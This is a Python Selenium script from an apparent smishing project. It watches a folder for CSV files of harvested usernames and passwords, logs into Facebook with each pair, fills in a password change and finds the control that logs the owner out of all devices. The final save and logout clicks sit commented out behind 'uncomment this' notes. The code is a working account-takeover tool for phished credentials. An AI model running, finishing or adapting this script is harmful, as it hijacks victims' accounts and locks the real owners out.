# Author: Karina Hernandez
import os
import time
from selenium import webdriver
#from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
#from selenium.common.exceptions import NoSuchElementException


# Set the path to the directory where new .csv files will be created
watch_directory = '/Users/karypaquot/Documents/GitHub/Smishing-Project/scripts'

# Set the URL of the login page
login_url = 'https://www.facebook.com'

# Set the path to your web driver
driver_path = '/usr/local/bin/chromedriver'


# Create a function that logs in using the given username and password
def login(username, password):
    # Create a new instance of the Chrome browser
    driver = webdriver.Chrome(driver_path)

    # Navigate to the login page
    driver.get(login_url)

    # Enter the username and password
    input_email = driver.find_element_by_name('email')
    input_pass = driver.find_element_by_name('pass')

    input_email.clear()
    input_email.send_keys(username)
    input_pass.clear()
    input_pass.send_keys(password)

    # Submit the login form
    input_pass.submit()

    # Wait for the page to load
    time.sleep(5)
    
    # Wait for the page to load and check if the login was successful
    try:
        success_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'html._9dls.__fb-light-mode'))
        )
    except:
        # Login was unsuccessful, exit the function
        driver.quit()
        # delete the .csv file 
        os.remove(os.path.join(watch_directory, filename))
        return
    
    # Set the url to the settings page
    settings_url = 'https://www.facebook.com/settings/?tab=account'

    # navigate to the settings page
    driver.get(settings_url)

    # Wait for the page to load
    time.sleep(5)

    #set the url to the security page 
    security_url = 'https://www.facebook.com/settings?tab=security'

    #navigate to the security page 
    driver.get(security_url)

    # Wait for the page to load
    time.sleep(5)

    # locate the iframe where the html doc is 
    iframe = driver.find_elements_by_tag_name('iframe')[0]

    # switch to that frame
    driver.switch_to.frame(iframe)

    # locate the login div class inside the iframe
    login_class = driver.find_element_by_css_selector('div._1xpm._4-u2._4-u8')

    # locate the inner div class in the login div class
    inner_div = login_class.find_element_by_css_selector('div._1nfz._4-u3')

    # locate the change password table that is clickable
    clickable_table = inner_div.find_element_by_css_selector('table._4p8y.uiGrid._51mz')

    # click the table to make it viewable
    clickable_table.click()

    time.sleep(3)
    
    # locate the password old input field 
    pass_old_id = driver.find_element_by_id('password_old')

    # send the password to the input field
    pass_old_id.send_keys(password)

    # get the new password field by id 
    input_new_password = driver.find_element_by_id('password_new')

    # set the new password
    new_password = 'WeLove378!'

    input_new_password.send_keys(password)
    #input_new_password.send_keys(new_password)

    # get the retype new password field bye id
    input_retype_new_password = driver.find_element_by_id('password_confirm')
    
    # set the retyped password
    input_retype_new_password.send_keys(password)

    # uncomment this to save the new password 
    #save_changes = driver.find_element_by_id('u_b_0_WN')
    
    #save_changes.click()

    # LOG OUT OF ALL DEVICES 

    # locate when you're logged in div class 
    connected_devices = driver.find_element_by_css_selector('div._k7f._15va._4-u2._4-u8')

    see_more_label = connected_devices.find_element_by_css_selector('div._4h8e._4-u3')

    clickable_label = see_more_label.find_element_by_css_selector('div._42ef._8u')

    clickable_label.click()

    log_out_all_sessions = connected_devices.find_element_by_css_selector('div._ohf.rfloat')

    # uncomment this to log out of all sessions
    #log_out_all_sessions.click()

    # Close the browser
    #driver.quit()

# Set the initial list of files in the directory
before = dict ([(f, None) for f in os.listdir(watch_directory)])

while True:
    # Get the list of files in the directory
    after = dict ([(f, None) for f in os.listdir(watch_directory)])

    # Get the list of new files
    new_files = [f for f in after if not f in before]

    # Process new files
    for filename in new_files:
        # Check if the file is a .csv file
        if filename.endswith('.csv'):
            # Open the file and read the first line
            with open(os.path.join(watch_directory, filename), 'r') as f:
                lines = f.readlines()
                line = lines[1].strip()

            # Split the line into two strings
            username, password = line.split(',')

            # Log in using the username and password
            login(username, password)

    # Update the list of files in the directory
    before = after

    # Wait for 10 seconds before checking for new files again
    time.sleep(10)

